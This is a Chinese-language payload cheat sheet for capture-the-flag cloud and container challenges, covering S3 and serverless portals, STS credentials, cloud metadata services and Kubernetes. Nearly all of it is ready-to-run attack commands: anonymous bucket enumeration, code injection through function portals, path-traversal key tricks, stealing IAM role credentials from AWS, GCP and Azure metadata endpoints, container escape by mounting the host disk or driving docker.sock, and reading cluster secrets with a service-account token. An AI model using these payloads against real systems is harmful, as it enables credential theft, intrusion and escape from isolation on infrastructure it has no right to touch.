# Payload DB — 云 / 容器（S3 / 云函数 / IMDS / K8s）

> 云题的 flag 通常在「对象存储里的敏感对象」「环境变量 / 元数据」「函数配置」三处。
> 先问自己：这个端点背后是不是对象存储？是不是函数？凭据从哪来？

## S3 兼容对象存储（path-style / 匿名）
- 列桶：`curl -s "http://T/"` → 返回 `<ListBucketResult>` 说明可匿名列举。
- 列出全部对象：`curl -s "http://T/?list-type=2"`；带前缀 `?prefix=&max-keys=1000`。
- 直取对象：`curl -s "http://T/<key>"`。**逐层列前缀找 flag/secret/backup 之类的 key**。
- aws cli（若镜像有）：`aws --endpoint-url http://T s3 ls --no-sign-request`、
  `aws --endpoint-url http://T s3 cp s3://bucket/flag . --no-sign-request`。
- 常见敏感 key：`flag`、`flag.txt`、`secret`、`.env`、`backup.zip`、`config.json`、
  `credentials`、`*.sql`、`private/*`。
- 桶策略/ACL 泄露：`?policy`、`?acl`、`?versioning`；旧版本对象 `?versions` 常留敏感数据。

## 云函数 / Serverless 管理门户
- 门户常见路由：`/invoke`、`/api/function`、`/run`、`/execute`、`/admin`。
- 函数**代码/环境变量**常可从门户读回：找 `/env`、`/config`、`/versions`、`/logs`。
- 命令注入走参数：`{"code":"import os;os.system('cat /flag*')"}` 或 `{"cmd":"..."}`。
- Python 函数注入：`__import__('os').popen('cat /flag*').read()`、
  `().__class__.__bases__[0].__subclasses__()` 找 `os._wrap_close`。
- Node 函数注入：`require('child_process').execSync('cat /flag*').toString()`。
- 若门户只回显日志：把结果写进日志再读日志端点。

## 临时凭据 / STS 门户
- 门户生成临时访问凭证 → **拿着它去调对象存储**（这是设计好的两步题）。
- 返回体形如 `{AccessKeyId, SecretAccessKey, SessionToken, Expiration}`。
- 用凭证（无 aws cli 时手写 SigV4 太重 → 优先找**预签名 URL**）：
  `curl -s "http://T/presign?key=flag"` → 返回带 `X-Amz-Signature` 的 URL → 直接 curl 它。
- 常见坑：门户只允许「读某个前缀」，用**路径穿越**或改 `key` 参数越权：
  `?key=../flag`、`?key=%2e%2e%2fflag`、`?key=flag`（把前缀换成目标）。

## IMDS（云元数据，从 SSRF / 容器内取）
- AWS：`http://169.254.169.254/latest/meta-data/`；IMDSv2 需先 PUT token：
  `TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds:21600")`
  然后所有请求带 `-H "X-aws-ec2-metadata-token: $TOKEN"`。
- 角色凭据：`/latest/meta-data/iam/security-credentials/<role>` → 拿 AK/SK/token。
- 用户数据（常含口令）：`/latest/user-data`。
- GCP：`http://metadata.google.internal/computeMetadata/v1/` + 头 `Metadata-Flavor: Google`。
- Azure：`http://169.254.169.254/metadata/instance?api-version=2021-02-01` + 头 `Metadata: true`。

## 容器逃逸 / K8s
- 查是否在容器：`cat /proc/1/cgroup`、`ls /.dockerenv`、`cat /proc/self/status | grep CapEff`。
- 特权容器：`capsh --print`；有 `CAP_SYS_ADMIN` → 挂载宿主盘：
  `mkdir /mnt/h && mount /dev/sda1 /mnt/h && ls /mnt/h`。
- 挂载了 docker.sock：`curl -s --unix-socket /var/run/docker.sock http://x/containers/json` → 起特权容器读宿主。
- K8s SA token：`/var/run/secrets/kubernetes.io/serviceaccount/token` +
  `curl -k -H "Authorization: Bearer $T" https://kubernetes.default/api/v1/namespaces/default/secrets`。
- 环境变量先看一眼：`env | grep -iE 'key|token|secret|pass|flag'`（云题最省事的一步）。
